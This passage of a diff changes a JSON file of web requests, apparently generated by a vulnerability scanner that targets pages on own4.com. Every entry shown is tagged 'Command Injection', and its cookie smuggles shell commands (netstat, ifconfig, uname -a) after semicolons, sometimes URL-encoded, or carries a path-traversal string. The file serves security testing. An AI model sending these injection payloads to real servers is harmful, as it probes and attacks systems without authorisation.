-                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
             "url": "https://own4.com/page2.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -7478,46 +7148,6 @@
         }, 
         {
             "url": "https://own4.com/page2.php", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
             "header": {
                 "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
             }, 
@@ -7565,51 +7195,41 @@
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
@@ -7705,6 +7325,46 @@
             "class": "Command Injection"
         }, 
         {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page11.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -7790,46 +7450,6 @@
                 "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
@@ -8065,6 +7685,106 @@
             "class": "Command Injection"
         }, 
         {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
@@ -8160,46 +7880,6 @@
                 "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a;"
             }, 
             "type": "GET", 
             "class": "Command Injection"
